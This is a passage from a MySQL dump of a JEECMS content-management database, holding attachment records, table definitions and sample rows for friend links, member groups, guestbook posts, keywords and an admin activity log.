('/v6/u/cms/www/201401/13140909s64p.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201401/13141723ywh0.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201401/13142644qpdm.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201401/131429269ikl.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201401/131431450xia.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201401/131431578u9o.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201403/1316123792p0.docx', '0_開發需求_.docx', '0', null), ('/v6/u/cms/www/201403/13163251c8d5.docx', '0_開發需求_.docx', '0', null), ('/v6/u/cms/www/201403/131634322gqg.docx', '0_開發需求_.docx', '0', null), ('/v6/u/cms/www/201403/131636277cxi.docx', '0_開發需求_.docx', '0', null), ('/v6/u/cms/www/201403/13163934xmp0.docx', '0_開發需求_.docx', '0', null), ('/v6/u/cms/www/201403/13164248ng73.docx', '0_開發需求_.docx', '0', null), ('/v6/u/cms/www/201403/13165347xxty.docx', '0_開發需求_.docx', '0', null), ('/v6/u/cms/www/201403/13170503bwpw.jpg', '1.jpg', '0', null), ('/v6/u/cms/www/201403/13170603q1bw.jpg', '1.jpg', '0', null), ('/v6/u/cms/www/201403/131706463pqt.jpg', '1.jpg', '0', null), ('/v6/u/cms/www/201403/13172446osvy.jpg', '1.jpg', '0', null), ('/v6/u/cms/www/201403/13172626x71c.docx', '0_開發需求_.docx', '0', null), ('/v6/u/cms/www/201403/13173752etj3.zip', 'ChromeSetup.zip', '0', null), ('/v6/u/cms/www/201403/13173805fii8.zip', 'ChromeSetup.zip', '0', null), ('/v6/u/cms/www/201403/14091703u57k.docx', '0_開發需求_.docx', '0', null), ('/v6/u/cms/www/201403/14091741h0w0.zip', 'ChromeSetup.zip', '0', null), ('/v6/u/cms/www/201403/14092030cnyx.mp4', '18183451i5bi.mp4', '0', null), ('/v6/u/cms/www/201403/14092835ljai.docx', '0_開發需求_.docx', '0', null), ('/v6/u/cms/www/201403/14095531y5tg.zip', 'ChromeSetup.zip', '0', null), ('/v6/u/cms/www/201403/14095543za61.docx', '0_開發需求_.docx', '0', null), ('/v6/u/cms/www/201403/14095551kk1a.docx', '0_開發需求_.docx', '0', null), ('/v6/u/cms/www/201403/14095759mdqw.docx', '0_開發需求_.docx', '0', null), ('/v6/u/cms/www/201403/14102936l7gw.txt', 'freemarker.txt', '0', null), ('/v6/u/cms/www/201403/14104521p9ey.zip', 'bbs-update-2012-11-2.zip', '0', null), ('/v6/u/cms/www/201403/14105137jxtn.mp4', '/v6/u/cms/www/201403/14105137jxtn.mp4', '0', null), ('/v6/u/cms/www/201403/14112725dsar.zip', '/v6/u/cms/www/201403/14112725dsar.zip', '0', null), ('/v6/u/cms/www/201403/14130702z3xz.png', '/v6/u/cms/www/201403/14130702z3xz.png', '0', null), ('/v6/u/cms/www/201403/14165746s64i.pdf', '1.pdf', '0', null), ('/v6/u/cms/www/201403/1914315903bj.jpg', '1.jpg', '0', null), ('/v6/u/cms/www/201404/20151821gj8y.jpg', '1.jpg', '0', null), ('/v6/u/cms/www/201404/2015202141s0.jpg', '1.jpg', '0', null), ('/v6/u/cms/www/201404/211128348kuw.jpg', '1.jpg', '0', null), ('/v6/u/cms/www/201404/2111305770l1.jpg', '1.jpg', '0', null), ('/v6/u/cms/www/201404/21113452hsxh.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201404/211137096eif.jpg', 'mv.jpg', '0', null), ('/v6/u/cms/www/201404/211149148tx0.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201404/21115759y8sm.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201404/211511276v74.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201404/21151948k1fh.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201404/21154820xtfs.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201404/2115485050rw.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201404/21155236mk9b.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201404/22084701xqxy.doc', '/v6/u/cms/www/201404/22084701xqxy.doc', '0', null), ('/v6/u/cms/www/201404/22084833ys27.doc', '/v6/u/cms/www/201404/22084833ys27.doc', '0', null), ('/v6/u/cms/www/201404/22111217hftv.doc', 'Linux开启mysql远程连接.doc', '0', null), ('/v6/u/cms/www/201404/22111332dwt3.doc', 'Linux开启mysql远程连接.doc', '0', null), ('/v6/u/cms/www/201404/22114143pw1a.doc', 'Linux开启mysql远程连接.doc', '0', null), ('/v6/u/cms/www/201404/22132355vqdf.txt', 'IBM LDAP.txt', '0', null), ('/v6/u/cms/www/201404/22133304pnoh.txt', '/v6/u/cms/www/201404/22133304pnoh.txt', '0', null), ('/v6/u/cms/www/201404/22133312pz3j.exe', 'wpp.exe', '0', null), ('/v6/u/cms/www/201404/22135235m1m1.txt', 'cmstop.txt', '0', null), ('/v6/u/cms/www/201404/22135348pbqp.swf', '2.swf', '0', null), ('/v6/u/cms/www/201404/221353537d0o.doc', 'discuz_2.doc', '0', null), ('/v6/u/cms/www/201404/22140446zkgv.txt', 'jeecms新bug.txt', '0', null), ('/v6/u/cms/www/201404/22140629jx27.txt', '360检测.txt', '0', null), ('/v6/u/cms/www/201404/22140634er4n.doc', 'Discuz_X2.0数据字典(数据库表作用解释).doc', '0', null), ('/v6/u/cms/www/201404/22140716e5bk.flv', '/v6/u/cms/www/201404/22140716e5bk.flv', '0', null), ('/v6/u/cms/www/201404/22141101f9tv.txt', '360检测.txt', '0', null), ('/v6/u/cms/www/201404/22141404irh6.docx', 'Apache_Shiro_使用手册.docx', '0', null), ('/v6/u/cms/www/201404/22142207xrqx.doc', 'Discuz_X2.0数据字典(数据库表作用解释).doc', '0', null), ('/v6/u/cms/www/201404/22145137jigp.docx', 'Apache_Shiro_使用手册.docx', '0', null), ('/v6/u/cms/www/201404/22145142drkb.docx', 'Apache_Shiro_使用手册.docx', '0', null), ('/v6/u/cms/www/201404/221501301rkt.docx', 'Apache_Shiro_使用手册.docx', '0', null), ('/v6/u/cms/www/201404/22151702mcwi.docx', 'Apache_Shiro_使用手册.docx', '0', null), ('/v6/u/cms/www/201404/22152145c9do.doc', 'Linux开启mysql远程连接.doc', '0', null), ('/v6/u/cms/www/201404/22152231wfrv.mp4', '/v6/u/cms/www/201404/22152231wfrv.mp4', '0', null), ('/v6/u/cms/www/201404/22155743mgws.txt', 'bug平台推荐.txt', '0', null), ('/v6/u/cms/www/201404/22155756p9of.txt', 'flot柱状图.txt', '0', null), ('/v6/u/cms/www/201404/22155756scdn.txt', 'flot使用笔记.txt', '0', null), ('/v6/u/cms/www/201404/28134316erf3.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201404/281402505i20.jpg', 'mv.jpg', '0', null), ('/v6/u/cms/www/201404/28140346452f.jpg', 'mv.jpg', '0', null), ('/v6/u/cms/www/201404/30140543hzlx.gif', 'webLogo.gif', '0', null), ('/v6/u/cms/www/201405/08091845sh2l.jpg', '1.JPG', '0', null), ('/v6/u/cms/www/201405/08092143cyap.jpg', '1.JPG', '0', null), ('/v6/u/cms/www/201405/08092249ype2.jpg', '1.JPG', '0', null), ('/v6/u/cms/www/201405/08092924h3fr.jpg', '1.JPG', '0', null), ('/v6/u/cms/www/201405/08093111b3jm.jpg', '1.JPG', '0', null), ('/v6/u/cms/www/201405/09083819wiab.jpg', 'mv.jpg', '0', null), ('/v6/u/cms/www/201405/090840146ik7.jpg', 'mv.jpg', '0', null), ('/v6/u/cms/www/201405/090918028k13.jpg', 'mv.jpg', '0', null), ('/v6/u/cms/www/201406/09144419786f.txt', 'bbs好的功能.txt', '0', null), ('/v6/u/cms/www/201406/09145849ap2u.docx', '1.docx', '0', null), ('/v6/u/cms/www/201406/09151219pj5s.doc', '2.doc', '0', null), ('/v6/u/cms/www/201406/0915215434ij.txt', 'cmstop.txt', '0', null), ('/v6/u/cms/www/201407/121650299xv9.doc', 'DiscuzX2文件说明,目录说明.doc', '0', null), ('/v6/u/cms/www/201407/12165642273e.doc', 'Discuz_X2.0数据字典(数据库表作用解释).doc', '0', null), ('/v6/u/cms/www/201407/12170522j2ct.jpg', '1.jpg', '0', null), ('/v6/u/cms/www/201407/30093714q9ic.mp4', '/v6/u/cms/www/201407/30093714q9ic.mp4', '0', null), ('/v6/u/cms/www/201407/30130947bmm3.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201407/30170627hj1m.jpg', 'mv.jpg', '0', null), ('/v6/u/cms/www/201407/31114444inln.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201407/31114945lp9t.jpg', 'mv.jpg', '0', null), ('/v6/u/cms/www/201407/31115246futn.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201407/31115423u7e6.jpg', 'mv1.jpg', '0', null), ('/v6/u/cms/www/201407/31132254zdh7.jpg', 'mv.jpg', '0', null), ('/v6/u/cms/www/201409/03105035q9em.mp4', '/v6/u/cms/www/201409/03105035q9em.mp4', '0', null), ('/v6/u/cms/www/201409/03105050xcbs.txt', 'bug平台推荐.txt', '0', null), ('/v6/wenku/www/201312/241031214kys.txt', '/v6/wenku/www/201312/241031214kys.txt', '0', null), ('/v6/wenku/www/201401/16164720tu2n.doc', '/v6/wenku/www/201401/16164720tu2n.doc', '0', null), ('/v6/wenku/www/201401/17083718btie.doc', '/v6/wenku/www/201401/17083718btie.doc', '0', null), ('/v6/wenku/www/201401/17084032522j.doc', '/v6/wenku/www/201401/17084032522j.doc', '0', null), ('/v6/wenku/www/201401/170842070sy2.doc', '/v6/wenku/www/201401/170842070sy2.doc', '0', null), ('/v6/wenku/www/201401/17084442fd08.doc', '/v6/wenku/www/201401/17084442fd08.doc', '0', null), ('/v6/wenku/www/201401/17085101zvcg.doc', '/v6/wenku/www/201401/17085101zvcg.doc', '0', null), ('/v6/wenku/www/201401/25095002cniq.doc', '/v6/wenku/www/201401/25095002cniq.doc', '0', null), ('/v6/wenku/www/201403/10115402nl6c.docx', '/v6/wenku/www/201403/10115402nl6c.docx', '0', null), ('/v6/wenku/www/201403/1011550974pv.docx', '/v6/wenku/www/201403/1011550974pv.docx', '0', null), ('/v6/wenku/www/201403/101155409soa.txt', '/v6/wenku/www/201403/101155409soa.txt', '0', null), ('/v6/wenku/www/201403/10115750uxwh.txt', '/v6/wenku/www/201403/10115750uxwh.txt', '0', null), ('/v6/wenku/www/201406/04132656esvy.pdf', '/v6/wenku/www/201406/04132656esvy.pdf', '0', null), ('/v6/wenku/www/201406/04133131ky4f.pdf', '/v6/wenku/www/201406/04133131ky4f.pdf', '0', null), ('/v6/wenku/www/201406/04133159jryy.pdf', '/v6/wenku/www/201406/04133159jryy.pdf', '0', null), ('/v6/wenku/www/201406/04133312rszg.pdf', '/v6/wenku/www/201406/04133312rszg.pdf', '0', null), ('/v6/wenku/www/201406/04133437555h.pdf', '/v6/wenku/www/201406/04133437555h.pdf', '0', null), ('/v6/wenku/www/201406/04133611h3sa.pdf', '/v6/wenku/www/201406/04133611h3sa.pdf', '0', null), ('/v6/wenku/www/201406/041340029cmx.pdf', '/v6/wenku/www/201406/041340029cmx.pdf', '0', null), ('/v6/wenku/www/201406/0413413473t5.pdf', '/v6/wenku/www/201406/0413413473t5.pdf', '0', null), ('/v6/wenku/www/201406/041353368k3b.doc', '/v6/wenku/www/201406/041353368k3b.doc', '0', null), ('/v6/wenku/www/201406/04135541s2ay.doc', '/v6/wenku/www/201406/04135541s2ay.doc', '0', null), ('/v6/wenku/www/201408/08112543cj83.pdf', '/v6/wenku/www/201408/08112543cj83.pdf', '0', null), ('/v6/wenku/www/201408/08131514njo0.pdf', '/v6/wenku/www/201408/08131514njo0.pdf', '0', null), ('/v6/wenku/www/201411/061426416ze3.doc', '/v6/wenku/www/201411/061426416ze3.doc', '0', null), ('/v6/wenku/www/201411/07142936mhzk.docx', '/v6/wenku/www/201411/07142936mhzk.docx', '0', null), ('/v6/wenku/www/201411/07143112x1tn.docx', '/v6/wenku/www/201411/07143112x1tn.docx', '0', null);
COMMIT;

-- ----------------------------
--  Table structure for `jc_friendlink`
-- ----------------------------
DROP TABLE IF EXISTS `jc_friendlink`;
CREATE TABLE `jc_friendlink` (
  `friendlink_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `friendlinkctg_id` int(11) NOT NULL,
  `site_name` varchar(150) NOT NULL COMMENT '网站名称',
  `domain` varchar(255) NOT NULL COMMENT '网站地址',
  `logo` varchar(150) DEFAULT NULL COMMENT '图标',
  `email` varchar(100) DEFAULT NULL COMMENT '站长邮箱',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `views` int(11) NOT NULL DEFAULT '0' COMMENT '点击次数',
  `is_enabled` char(1) NOT NULL DEFAULT '1' COMMENT '是否显示',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  PRIMARY KEY (`friendlink_id`),
  KEY `fk_jc_ctg_friendlink` (`friendlinkctg_id`),
  KEY `fk_jc_friendlink_site` (`site_id`),
  CONSTRAINT `fk_jc_ctg_friendlink` FOREIGN KEY (`friendlinkctg_id`) REFERENCES `jc_friendlink_ctg` (`friendlinkctg_id`),
  CONSTRAINT `fk_jc_friendlink_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 COMMENT='CMS友情链接';

-- ----------------------------
--  Records of `jc_friendlink`
-- ----------------------------
BEGIN;
INSERT INTO `jc_friendlink` VALUES ('1', '1', '1', '中国人民银行', 'http://11.129.189.13/', null, 'tes', '', '35', '1', '1'), ('2', '1', '1', '病毒防治中心', 'http://11.129.189.13/', null, 'jeecms@163.com', 'JEEBBS论坛', '5', '1', '10'), ('3', '1', '2', '远程培训系统', 'http://www.360buy.com/', '/u/cms/www/201112/1910271036lr.gif', '', '', '4', '1', '10'), ('4', '1', '2', '当当网', 'http://www.dangdang.com/', '/u/cms/www/201112/191408344rwj.gif', '', '', '1', '1', '10'), ('5', '1', '2', '亚马逊', 'http://www.amazon.cn/', '/u/cms/www/201112/19141012lh2q.gif', '', '', '2', '1', '10'), ('6', '1', '2', 'ihush', 'http://www.ihush.com/', '/u/cms/www/201112/19141255yrfb.gif', '', '', '1', '1', '10');
COMMIT;

-- ----------------------------
--  Table structure for `jc_friendlink_ctg`
-- ----------------------------
DROP TABLE IF EXISTS `jc_friendlink_ctg`;
CREATE TABLE `jc_friendlink_ctg` (
  `friendlinkctg_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `friendlinkctg_name` varchar(50) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  PRIMARY KEY (`friendlinkctg_id`),
  KEY `fk_jc_friendlinkctg_site` (`site_id`),
  CONSTRAINT `fk_jc_friendlinkctg_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COMMENT='CMS友情链接类别';

-- ----------------------------
--  Records of `jc_friendlink_ctg`
-- ----------------------------
BEGIN;
INSERT INTO `jc_friendlink_ctg` VALUES ('1', '1', '文字链接', '1'), ('2', '1', '品牌专区（图片链接）', '2'), ('4', '1', '', '10');
COMMIT;

-- ----------------------------
--  Table structure for `jc_group`
-- ----------------------------
DROP TABLE IF EXISTS `jc_group`;
CREATE TABLE `jc_group` (
  `group_id` int(11) NOT NULL AUTO_INCREMENT,
  `group_name` varchar(100) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `need_captcha` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否需要验证码',
  `need_check` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否需要审核',
  `allow_per_day` int(11) NOT NULL DEFAULT '4096' COMMENT '每日允许上传KB',
  `allow_max_file` int(11) NOT NULL DEFAULT '1024' COMMENT '每个文件最大KB',
  `allow_suffix` varchar(255) DEFAULT 'jpg,jpeg,gif,png,bmp' COMMENT '允许上传的后缀',
  `is_reg_def` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否默认会员组',
  `allow_file_size` int(11) NOT NULL DEFAULT '4096' COMMENT '每个上传文库的文件大小限制kB',
  `allow_file_total` int(11) NOT NULL DEFAULT '0' COMMENT '上传总数限制(0没有限制)',
  PRIMARY KEY (`group_id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COMMENT='CMS会员组表';

-- ----------------------------
--  Records of `jc_group`
-- ----------------------------
BEGIN;
INSERT INTO `jc_group` VALUES ('1', '普通会员', '2', '1', '1', '0', '0', '', '1', '1024', '10'), ('2', '高级组', '10', '1', '1', '0', '0', '', '0', '4096', '0'), ('3', 'vip', '11', '1', '1', '0', '0', '', '0', '4096', '0');
COMMIT;

-- ----------------------------
--  Table structure for `jc_guestbook`
-- ----------------------------
DROP TABLE IF EXISTS `jc_guestbook`;
CREATE TABLE `jc_guestbook` (
  `guestbook_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `guestbookctg_id` int(11) NOT NULL,
  `member_id` int(11) DEFAULT NULL COMMENT '留言会员',
  `admin_id` int(11) DEFAULT NULL COMMENT '回复管理员',
  `ip` varchar(50) NOT NULL COMMENT '留言IP',
  `create_time` datetime NOT NULL COMMENT '留言时间',
  `replay_time` datetime DEFAULT NULL COMMENT '回复时间',
  `is_checked` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否审核',
  `is_recommend` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否推荐',
  PRIMARY KEY (`guestbook_id`),
  KEY `fk_jc_ctg_guestbook` (`guestbookctg_id`),
  KEY `fk_jc_guestbook_admin` (`admin_id`),
  KEY `fk_jc_guestbook_member` (`member_id`),
  KEY `fk_jc_guestbook_site` (`site_id`),
  CONSTRAINT `fk_jc_ctg_guestbook` FOREIGN KEY (`guestbookctg_id`) REFERENCES `jc_guestbook_ctg` (`guestbookctg_id`),
  CONSTRAINT `fk_jc_guestbook_admin` FOREIGN KEY (`admin_id`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_guestbook_member` FOREIGN KEY (`member_id`) REFERENCES `jc_user` (`user_id`),
  CONSTRAINT `fk_jc_guestbook_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 COMMENT='CMS留言';

-- ----------------------------
--  Records of `jc_guestbook`
-- ----------------------------
BEGIN;
INSERT INTO `jc_guestbook` VALUES ('3', '1', '1', null, '1', '117.41.152.66', '2016-10-10 15:02:04', null, '1', '1'), ('4', '1', '1', null, '1', '117.41.152.66', '2016-10-10 15:07:53', null, '1', '1'), ('5', '1', '1', null, '1', '117.41.152.66', '2016-10-10 15:08:41', null, '1', '1'), ('6', '1', '1', null, '1', '117.41.152.66', '2016-10-10 15:09:06', null, '1', '1');
COMMIT;

-- ----------------------------
--  Table structure for `jc_guestbook_ctg`
-- ----------------------------
DROP TABLE IF EXISTS `jc_guestbook_ctg`;
CREATE TABLE `jc_guestbook_ctg` (
  `guestbookctg_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `ctg_name` varchar(100) NOT NULL COMMENT '名称',
  `priority` int(11) NOT NULL DEFAULT '10' COMMENT '排列顺序',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  PRIMARY KEY (`guestbookctg_id`),
  KEY `fk_jc_guestbookctg_site` (`site_id`),
  CONSTRAINT `fk_jc_guestbookctg_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COMMENT='CMS留言类别';

-- ----------------------------
--  Records of `jc_guestbook_ctg`
-- ----------------------------
BEGIN;
INSERT INTO `jc_guestbook_ctg` VALUES ('1', '1', '普通', '1', '普通留言'), ('2', '1', '投诉', '10', '投诉');
COMMIT;

-- ----------------------------
--  Table structure for `jc_guestbook_ctg_department`
-- ----------------------------
DROP TABLE IF EXISTS `jc_guestbook_ctg_department`;
CREATE TABLE `jc_guestbook_ctg_department` (
  `guestbookctg_id` int(11) NOT NULL,
  `depart_id` int(11) NOT NULL,
  PRIMARY KEY (`guestbookctg_id`,`depart_id`),
  KEY `fk_jc_channel_department` (`depart_id`),
  CONSTRAINT `fk_jc_department_guestbook_ctg` FOREIGN KEY (`guestbookctg_id`) REFERENCES `jc_guestbook_ctg` (`guestbookctg_id`),
  CONSTRAINT `fk_jc_guestbook_ctg_department` FOREIGN KEY (`depart_id`) REFERENCES `jc_department` (`depart_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS留言类别部门关联表';

-- ----------------------------
--  Table structure for `jc_guestbook_ext`
-- ----------------------------
DROP TABLE IF EXISTS `jc_guestbook_ext`;
CREATE TABLE `jc_guestbook_ext` (
  `guestbook_id` int(11) NOT NULL,
  `title` varchar(255) DEFAULT NULL COMMENT '留言标题',
  `content` longtext COMMENT '留言内容',
  `reply` longtext COMMENT '回复内容',
  `email` varchar(100) DEFAULT NULL COMMENT '电子邮件',
  `phone` varchar(100) DEFAULT NULL COMMENT '电话',
  `qq` varchar(50) DEFAULT NULL COMMENT 'QQ',
  KEY `fk_jc_ext_guestbook` (`guestbook_id`),
  CONSTRAINT `fk_jc_ext_guestbook` FOREIGN KEY (`guestbook_id`) REFERENCES `jc_guestbook` (`guestbook_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS留言内容';

-- ----------------------------
--  Records of `jc_guestbook_ext`
-- ----------------------------
BEGIN;
INSERT INTO `jc_guestbook_ext` VALUES ('3', '新版jeecms v8的改动很大，希望做得更好，持续关注中。', '新版jeecms v8的改动很大，希望做得更好，持续关注中。', null, null, null, null), ('4', '怎么在页面首页放一个视频之后我点击的时候就可以看？', '怎么在页面首页放一个视频之后我点击的时候就可以看？', null, null, null, null), ('5', '网店和论坛的用户管理和jeecms 可以统一起来吗？	', '网店和论坛的用户管理和jeecms 可以统一起来吗？	', null, null, null, null), ('6', '请问在内容中上传视频的限制是多大，能不能自己设置设置视频的大小	', '请问在内容中上传视频的限制是多大，能不能自己设置设置视频的大小	', null, null, null, null);
COMMIT;

-- ----------------------------
--  Table structure for `jc_job_apply`
-- ----------------------------
DROP TABLE IF EXISTS `jc_job_apply`;
CREATE TABLE `jc_job_apply` (
  `job_apply_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL COMMENT '用户id',
  `content_id` int(11) NOT NULL COMMENT '职位id',
  `apply_time` datetime NOT NULL COMMENT '申请时间',
  PRIMARY KEY (`job_apply_id`),
  KEY `fk_jc_job_apply_user` (`user_id`),
  KEY `fk_jc_job_apply_content` (`content_id`),
  CONSTRAINT `fk_jc_job_apply_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`),
  CONSTRAINT `fk_jc_job_apply_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='职位申请表';

-- ----------------------------
--  Table structure for `jc_keyword`
-- ----------------------------
DROP TABLE IF EXISTS `jc_keyword`;
CREATE TABLE `jc_keyword` (
  `keyword_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) DEFAULT NULL COMMENT '站点ID',
  `keyword_name` varchar(100) NOT NULL COMMENT '名称',
  `url` varchar(255) NOT NULL COMMENT '链接',
  `is_disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  PRIMARY KEY (`keyword_id`),
  KEY `fk_jc_keyword_site` (`site_id`),
  CONSTRAINT `fk_jc_keyword_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='CMS内容关键词表';

-- ----------------------------
--  Records of `jc_keyword`
-- ----------------------------
BEGIN;
INSERT INTO `jc_keyword` VALUES ('1', null, '内容管理系统', '<a href=\"http://www.honghe.com/\" target=\"_blank\">内容管理系统</a>', '0');
COMMIT;

-- ----------------------------
--  Table structure for `jc_log`
-- ----------------------------
DROP TABLE IF EXISTS `jc_log`;
CREATE TABLE `jc_log` (
  `log_id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) DEFAULT NULL,
  `site_id` int(11) DEFAULT NULL,
  `category` int(11) NOT NULL COMMENT '日志类型',
  `log_time` datetime NOT NULL COMMENT '日志时间',
  `ip` varchar(50) DEFAULT NULL COMMENT 'IP地址',
  `url` varchar(255) DEFAULT NULL COMMENT 'URL地址',
  `title` varchar(255) DEFAULT NULL COMMENT '日志标题',
  `content` varchar(255) DEFAULT NULL COMMENT '日志内容',
  PRIMARY KEY (`log_id`),
  KEY `fk_jc_log_site` (`site_id`),
  KEY `fk_jc_log_user` (`user_id`),
  CONSTRAINT `fk_jc_log_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`),
  CONSTRAINT `fk_jc_log_user` FOREIGN KEY (`user_id`) REFERENCES `jc_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=258 DEFAULT CHARSET=utf8 COMMENT='CMS日志表';

-- ----------------------------
--  Records of `jc_log`
-- ----------------------------
BEGIN;
INSERT INTO `jc_log` VALUES ('1', null, null, '2', '2018-10-18 17:28:28', '127.0.0.1', '/jeeadmin/jeecms/login.do', 'login failure', 'username=test'), ('2', null, null, '2', '2018-10-18 17:28:33', '127.0.0.1', '/jeeadmin/jeecms/login.do', 'login failure', 'username=admin'), ('3', null, null, '2', '2018-10-18 17:28:39', '127.0.0.1', '/jeeadmin/jeecms/login.do', 'login failure', 'username=admin'), ('4', null, null, '2', '2018-10-18 17:29:12', '127.0.0.1', '/jeeadmin/jeecms/login.do', 'login failure', 'username=admin'), ('5', '1', null, '1', '2018-10-18 17:30:04', '127.0.0.1', '/jeeadmin/jeecms/login.do', 'login success', null), ('6', '1', '1', '3', '2018-10-18 17:30:39', '127.0.0.1', '/jeeadmin/jeecms/config/o_system_update.do', '修改系统设置', null), ('7', '1', '1', '3', '2018-10-18 17:31:29', '127.0.0.1', '/jeeadmin/jeecms/config/o_system_update.do', '修改系统设置', null), ('8', null, null, '2', '2018-10-18 20:08:41', '127.0.0.1', '/jeeadmin/jeecms/login.do', 'login failure', 'username=admin'), ('9', '1', null, '1', '2018-10-18 20:08:50', '127.0.0.1', '/jeeadmin/jeecms/login.do', 'login success', null), ('10', null, null, '2', '2018-10-18 20:25:03', '127.0.0.1', '/jeeadmin/jeecms/login.do', 'login failure', 'username=admin'), ('11', '1', null, '1', '2018-10-18 20:25:08', '127.0.0.1', '/jeeadmin/jeecms/login.do', 'login success', null), ('12', null, null, '2', '2018-10-18 21:44:19', '127.0.0.1', '/jeeadmin/jeecms/login.do', 'login failure', 'username=admin'), ('13', '1', null, '1', '2018-10-18 21:44:25', '127.0.0.1', '/jeeadmin/jeecms/login.do', 'login success', null), ('14', '1', '1', '3', '2018-10-18 22:06:34', '127.0.0.1', '/jeeadmin/jeecms/channel/o_update.do', '修改栏目', 'id=76;name=图片新闻'), ('15', '1', '1', '3', '2018-10-18 22:06:51', '127.0.0.1', '/jeeadmin/jeecms/channel/o_update.do', '修改栏目', 'id=75;name=工作动态'), ('16', '1', '1', '3', '2018-10-18 22:07:15', '127.0.0.1', '/jeeadmin/jeecms/channel/o_save.do', '增加栏目', 'id=94;title=null'), ('17', '1', '1', '3', '2018-10-18 22:07:35', '127.0.0.1', '/jeeadmin/jeecms/channel/o_save.do', '增加栏目', 'id=95;title=null'), ('18', '1', '1', '3', '2018-10-18 22:07:47', '127.0.0.1', '/jeeadmin/jeecms/channel/o_save.do', '增加栏目', 'id=96;title=null'), ('19', '1', '1', '3', '2018-10-18 22:07:59', '127.0.0.1', '/jeeadmin/jeecms/channel/o_save.do', '增加栏目', 'id=97;title=null'), ('20', '1', '1', '3', '2018-10-18 22:08:11', '127.0.0.1', '/jeeadmin/jeecms/channel/o_save.do', '增加栏目', 'id=98;title=null'), ('21', '1', '1', '3', '2018-10-18 22:08:23', '127.0.0.1', '/jeeadmin/jeecms/channel/o_save.do', '增加栏目', 'id=99;title=null'), ('22', '1', '1', '3', '2018-10-18 22:08:33', '127.0.0.1', '/jeeadmin/jeecms/channel/o_save.do', '增加栏目', 'id=100;title=null'), ('23', '1', '1', '3', '2018-10-18 22:08:45', '127.0.0.1', '/jeeadmin/jeecms/channel/o_save.do', '增加栏目', 'id=101;title=null'), ('24', '1', '1', '3', '2018-10-18 22:08:56', '127.0.0.1', '/jeeadmin/jeecms/channel/o_save.do', '增加栏目', 'id=102;title=null'), ('25', '1', '1', '3', '2018-10-18 22:09:07', '127.0.0.1', '/jeeadmin/jeecms/channel/o_save.do', '增加栏目', 'id=103;title=null'), ('26', '1', '1', '3', '2018-10-18 22:10:59', '127.0.0.1', '/jeeadmin/jeecms/channel/o_update.do', '修改栏目', 'id=80;name=网络调查'), ('27', '1', '1', '3', '2018-10-18 22:11:13', '127.0.0.1', '/jeeadmin/jeecms/channel/o_update.do', '修改栏目', 'id=77;name=视频'), ('28', '1', '1', '3', '2018-10-18 22:11:28', '127.0.0.1', '/jeeadmin/jeecms/channel/o_update.do', '修改栏目', 'id=78;name=下载'), ('29', '1', '1', '3', '2018-10-18 22:11:42', '127.0.0.1', '/jeeadmin/jeecms/channel/o_update.do', '修改栏目', 